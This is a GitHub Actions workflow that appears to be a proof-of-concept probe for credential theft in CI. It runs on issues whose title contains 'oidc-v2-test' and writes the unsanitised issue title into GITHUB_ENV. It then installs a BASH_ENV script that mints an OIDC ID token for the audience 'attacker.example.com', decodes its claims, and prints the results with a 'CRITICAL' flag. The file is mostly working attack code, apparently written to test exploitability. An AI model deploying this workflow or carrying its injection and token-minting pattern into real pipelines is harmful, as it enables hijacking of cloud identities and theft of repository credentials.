name: OIDC access from BASH_ENV
on:
  issues:
    types: [opened]

permissions:
  id-token: write
  contents: read

jobs:
  oidc-test:
    runs-on: ubuntu-latest
    if: contains(github.event.issue.title, 'oidc-v2-test')
    steps:
      - name: Inject BASH_ENV from issue title
        run: |
          echo "ISSUE_DATA=${{ github.event.issue.title }}" >> $GITHUB_ENV
          # Create BASH_ENV script that captures OIDC vars
          cat > /tmp/bash_env_oidc.sh << 'BEOF'
          export BASH_ENV_SOURCED=yes
          export HAS_OIDC_URL=$([ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ] && echo yes || echo no)
          export HAS_OIDC_TOKEN=$([ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ] && echo yes || echo no)
          export OIDC_URL_LEN=${#ACTIONS_ID_TOKEN_REQUEST_URL}
          export OIDC_TOKEN_LEN=${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}
          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ] && [ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ]; then
            JWT=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https://attacker.example.com" 2>/dev/null | python3 -c "import json,sys; print(json.loads(sys.stdin.read()).get('value',''))" 2>/dev/null) || true
            if [ -n "$JWT" ]; then
              export OIDC_MINTED=yes
              export OIDC_JWT_LEN=${#JWT}
              CLAIMS=$(echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null) || true
              export OIDC_SUB=$(echo "$CLAIMS" | python3 -c "import json,sys; print(json.loads(sys.stdin.read()).get('sub',''))" 2>/dev/null) || true
              export OIDC_AUD=$(echo "$CLAIMS" | python3 -c "import json,sys; print(json.loads(sys.stdin.read()).get('aud',''))" 2>/dev/null) || true
            fi
          fi
          BEOF
          echo "BASH_ENV=/tmp/bash_env_oidc.sh" >> $GITHUB_ENV

      - name: Check OIDC from BASH_ENV-injected code
        run: |
          echo "BASH_ENV_SOURCED=$BASH_ENV_SOURCED"
          echo "HAS_OIDC_URL=$HAS_OIDC_URL"
          echo "HAS_OIDC_TOKEN=$HAS_OIDC_TOKEN"
          echo "OIDC_URL_LEN=$OIDC_URL_LEN"
          echo "OIDC_TOKEN_LEN=$OIDC_TOKEN_LEN"
          echo "OIDC_MINTED=$OIDC_MINTED"
          echo "OIDC_JWT_LEN=$OIDC_JWT_LEN"
          echo "OIDC_SUB=$OIDC_SUB"
          echo "OIDC_AUD=$OIDC_AUD"
          if [ "$OIDC_MINTED" = "yes" ]; then
            echo "CRITICAL: OIDC token minted from BASH_ENV-injected code!"
          fi
